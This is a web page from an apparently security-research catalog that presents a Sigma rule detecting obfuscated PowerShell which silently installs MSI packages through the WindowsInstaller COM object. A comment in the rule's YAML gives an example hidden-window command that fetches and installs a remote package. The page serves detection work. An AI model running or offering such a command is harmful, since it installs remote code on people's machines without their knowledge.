@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule | 1200km</title><meta name="description" content="Sigma rule 7b6a7418-3afc-11f0-aff4-000d3abf478c. Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule. Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., &#39;indowsInstaller.Installer&#39;.Insert(0,&#39;W&#39;)) and correcting
+malformed URLs (e.g., converting &#39;htps://&#39; to &#39;https://&#39;) at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
+by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
+hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
+">
+<meta name="author" content="Andrey Pautov"><meta name="robots" content="index,follow">
+<meta name="keywords" content="7b6a7418-3afc-11f0-aff4-000d3abf478c, attack.stealth, attack.t1027.010, attack.t1218.007, attack.execution, attack.t1059.001, process_creation, windows, rule-status:experimental, severity:high, logsource-category:process_creation, logsource-product:windows, sigma-tag:attack.stealth, sigma-tag:attack.t1027.010, sigma-tag:attack.t1218.007, sigma-tag:attack.execution, sigma-tag:attack.t1059.001">
+<meta name="ttp-module-tags" content="rule-status:experimental, severity:high, logsource-category:process_creation, logsource-product:windows, sigma-tag:attack.stealth, sigma-tag:attack.t1027.010, sigma-tag:attack.t1218.007, sigma-tag:attack.execution, sigma-tag:attack.t1059.001">
+<link rel="canonical" href="https://1200km.com/ttp-simulation/detections/rules/7b6a7418-3afc-11f0-aff4-000d3abf478c/"><meta property="og:url" content="https://1200km.com/ttp-simulation/detections/rules/7b6a7418-3afc-11f0-aff4-000d3abf478c/">
+<meta property="og:type" content="website"><meta property="og:title" content="Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule"><meta property="og:description" content="Sigma rule 7b6a7418-3afc-11f0-aff4-000d3abf478c. Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule. Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., &#39;indowsInstaller.Installer&#39;.Insert(0,&#39;W&#39;)) and correcting
+malformed URLs (e.g., converting &#39;htps://&#39; to &#39;https://&#39;) at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
+by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
+hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
+"><meta property="og:image" content="https://1200km.com/assets/ap-logo.png">
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule"><meta name="twitter:description" content="Sigma rule 7b6a7418-3afc-11f0-aff4-000d3abf478c. Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule. Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., &#39;indowsInstaller.Installer&#39;.Insert(0,&#39;W&#39;)) and correcting
+malformed URLs (e.g., converting &#39;htps://&#39; to &#39;https://&#39;) at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
+by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
+hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
+"><meta name="twitter:image" content="https://1200km.com/assets/ap-logo.png">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","@id":"https://1200km.com/ttp-simulation/detections/rules/7b6a7418-3afc-11f0-aff4-000d3abf478c/#webpage","url":"https://1200km.com/ttp-simulation/detections/rules/7b6a7418-3afc-11f0-aff4-000d3abf478c/","name":"Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule","description":"Sigma rule 7b6a7418-3afc-11f0-aff4-000d3abf478c. Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule. Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).\nThe technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., 'indowsInstaller.Installer'.Insert(0,'W')) and correcting\nmalformed URLs (e.g., converting 'htps://' to 'https://') at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection\nby hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with\nhidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.\n","datePublished":"2026-09-27","dateModified":"2026-09-27","author":{"@type":"Person","name":"Andrey Pautov","url":"https://1200km.com/about.html"},"isPartOf":{"@type":"WebSite","@id":"https://1200km.com/#website","name":"1200km","url":"https://1200km.com/"}}</script>
+<link rel="stylesheet" href="/ttp-simulation/assets/catalog.css"><link rel="stylesheet" href="/ttp-simulation/assets/integration.css">
+
+</head><body data-root="/ttp-simulation/" id="top">
+<a class="skip" href="#main">Skip to module</a>
+<header class="topbar" data-pagefind-ignore><a class="brand" href="/">1200<span>km</span><small>SECURITY RESEARCH</small></a><nav aria-label="Ecosystem"><a href="/ttp-simulation/tools/">Attack Tools</a><a href="/ttp-simulation/">Attack Simulations</a><a href="/ttp-simulation/detections/">Detection Rules</a><a href="/ttp-simulation/telemetry/">Telemetry</a><a href="/ttp-simulation/tags/">Tags</a><a href="/threat-matrix/">Threat Matrix</a><a href="https://1200km.com/anomaly-detection-atlas/">Anomaly Atlas</a><a href="/guides.html">Guides</a><a href="/search.html">Search</a></nav></header>
+<main id="main" tabindex="-1" data-pagefind-body>
+
+<div id="reference-copy"><section class="hero"><div><p class="eyebrow">1200KM / sigma-rule</p><h1>Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule</h1><p class="lead">Sigma rule 7b6a7418-3afc-11f0-aff4-000d3abf478c. Obfuscated PowerShell MSI Install via WindowsInstaller COM — Sigma Rule. Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., &#39;indowsInstaller.Installer&#39;.Insert(0,&#39;W&#39;)) and correcting
+malformed URLs (e.g., converting &#39;htps://&#39; to &#39;https://&#39;) at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
+by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
+hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
+</p></div></section><section class="panel"><h2>Rule metadata and linked tags</h2><div class="tags"><a class="chip" href="/ttp-simulation/tags/rule-status/experimental/">experimental</a><a class="chip" href="/ttp-simulation/tags/severity/high/">high</a><a class="chip" href="/ttp-simulation/tags/logsource-category/process-creation/">process_creation</a><a class="chip" href="/ttp-simulation/tags/logsource-product/windows/">windows</a><a class="chip" href="/ttp-simulation/tags/sigma-tag/attack-stealth/">attack.stealth</a><a class="chip" href="/ttp-simulation/tags/sigma-tag/attack-t1027-010/">attack.t1027.010</a><a class="chip" href="/ttp-simulation/tags/sigma-tag/attack-t1218-007/">attack.t1218.007</a><a class="chip" href="/ttp-simulation/tags/sigma-tag/attack-execution/">attack.execution</a><a class="chip" href="/ttp-simulation/tags/sigma-tag/attack-t1059-001/">attack.t1059.001</a></div><p>Author: Meroujan Antonyan (vx3r). Source status: experimental; severity: high. Source dates: 2025-05-27 / not supplied.</p><pre class="code-sample" tabindex="0" aria-label="Original logsource"><code>{
+  &quot;category&quot;: &quot;process_creation&quot;,
+  &quot;product&quot;: &quot;windows&quot;
+}</code></pre><p><a href="https://github.com/anpa1200/sigma/blob/b249e9683190cffdcaf188ccbfb90bf4759844e1/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml">Pinned original Sigma rule</a> · <a href="https://github.com/SigmaHQ/Detection-Rule-License/blob/main/LICENSE.Detection.Rules.md">Detection Rule License 1.1</a></p><p>Source SHA-256: 2c03568b9ef6e258ba91f8a5e7644c796ed44e9802833d7282f0b4093ae38a9c</p></section><section class="panel"><h2>Detection logic</h2><p>Original source YAML. Source-tag agreement is not proof of complete semantic coverage. This rule has not been compiled for a SIEM backend or validated against live telemetry here.</p><pre class="code-sample" tabindex="0" aria-label="Original Sigma rule YAML, scroll horizontally if needed"><code>title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
+id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
+status: experimental
+description: |
+    Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+    The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., &#39;indowsInstaller.Installer&#39;.Insert(0,&#39;W&#39;)) and correcting
+    malformed URLs (e.g., converting &#39;htps://&#39; to &#39;https://&#39;) at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
+    by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
+    hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
+references:
+    - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
+    - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
+    - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
+author: Meroujan Antonyan (vx3r)
+date: 2025-05-27
+tags:
+    - attack.stealth
+    - attack.t1027.010
+    - attack.t1218.007
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    # Example: &quot;C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe&quot; -W Hidden -C &quot;$u=&#39;htps://example.com/&#39;;$i=New-Object -ComObject(&#39;indowsInstaller.Installer&#39;.Insert(0,&#39;W&#39;));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith(&#39;htps://&#39;)){$u.Insert(2,&#39;t&#39;)}else{$u}),&#39;&#39;)&quot;;
+    selection_img:
+        - Image|endswith:
+              - &#39;\powershell_ise.exe&#39;
+              - &#39;\powershell.exe&#39;
+              - &#39;\pwsh.exe&#39;
+        - OriginalFileName:
+              - &#39;PowerShell_ISE.EXE&#39;
+              - &#39;PowerShell.EXE&#39;
+              - &#39;pwsh.dll&#39;
+    selection_cli:
+        CommandLine|contains|all:
+            - &#39;-ComObject&#39;
+            - &#39;InstallProduct(&#39;
+            - &#39;.Insert(&#39;
+            - &#39;UILevel&#39;
+    condition: all of selection_*
+falsepositives:
+    - Unknown
+level: high
+</code></pre><p><a href="/ttp-simulation/data/detection-rules/7b6a7418-3afc-11f0-aff4-000d3abf478c.json">Original YAML and metadata in JSON</a></p></section><section class="panel"><h2>False positives</h2><ul><li>Unknown</li></ul></section><section class="panel"><h2>Source references</h2><ul><li><a href="https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/">https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/</a></li><li><a href="https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/">https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/</a></li><li><a href="https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457">https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457</a></li></ul></section></div>
+<section id="ecosystem-connections"><h2>Connected ecosystem references</h2><section class="panel"><h2>Exact source-tagged techniques</h2><ul><li><a href="/ttp-simulation/techniques/enterprise/T1027.010/">T1027.010 · Command Obfuscation</a> · <a href="/ttp-simulation/detections/enterprise/T1027.010/">Detection rules &amp; anomalies</a></li><li><a href="/ttp-simulation/techniques/enterprise/T1059.001/">T1059.001 · PowerShell</a> · <a href="/ttp-simulation/detections/enterprise/T1059.001/">Detection rules &amp; anomalies</a></li><li><a href="/ttp-simulation/techniques/enterprise/T1218.007/">T1218.007 · Msiexec</a> · <a href="/ttp-simulation/detections/enterprise/T1218.007/">Detection rules &amp; anomalies</a></li></ul></section><section class="panel"><h2>Telemetry review</h2><p>Read the original logsource above, then inspect the linked detection workspaces for technique-level sensor context. No per-rule telemetry equivalence is inferred.</p></section></section>
+<p class="muted">Pinned research references. No browser attack runner, live simulation result or validated detector is asserted. Source mappings and validation limits are preserved. <a href="/ttp-simulation/data/catalog.json">ATT&amp;CK / Atomic provenance</a> · <a href="/ttp-simulation/data/detections.json">Detection provenance</a>.</p>
+</main><footer data-pagefind-ignore><span>1200km · Andrey Pautov</span><a href="/ttp-simulation/detection-rules-notice.txt">Sigma attribution &amp; license</a><a href="/privacy.html">Privacy</a><a href="/search.html">Search the ecosystem</a></footer></body></html>
